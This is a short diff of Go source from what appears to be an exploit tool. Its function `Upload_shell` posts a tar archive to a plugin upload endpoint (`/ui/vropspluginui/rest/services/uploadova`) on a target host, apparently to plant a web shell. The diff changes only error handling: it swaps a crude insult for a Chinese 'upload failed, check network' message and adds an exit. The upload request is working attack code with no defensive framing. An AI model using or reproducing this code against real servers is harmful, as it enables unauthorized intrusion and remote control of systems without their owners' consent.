@@ -95,9 +95,10 @@ func Upload_shell(url string, buf bytes.Buffer) bool {
 	resp, err := client.R().SetFileBytes("uploadFile", "test.tar", buf.Bytes()).Post(url + "/ui/vropspluginui/rest/services/uploadova") // Use R() to create a request.
 	if err != nil {
 		_ = err
-		fmt.Println("nmsl")
-		// os.Exit(0)
+		fmt.Println("[-] 上传失败，请检查网络.")
+		os.Exit(0)
 	}
+	// log.Fatal(err)
 	_ = resp
 	// fmt.Println(resp)
 	//fmt.Printf(string(buf))
